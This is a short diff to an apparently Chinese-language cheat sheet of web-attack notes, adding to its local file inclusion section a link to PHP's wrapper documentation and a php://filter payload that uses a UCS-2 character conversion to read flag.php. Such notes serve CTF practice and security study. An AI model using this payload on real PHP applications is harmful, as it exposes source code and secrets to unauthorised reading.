@@ -851,7 +851,14 @@ config
 
 # LFI
 
+
+
 [支持的协议和封装协议](https://www.php.net/manual/zh/wrappers.php) //官方文档
+
+```php
+php://filter/read=convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php
+
+```
 
 *payload*
 ```shell
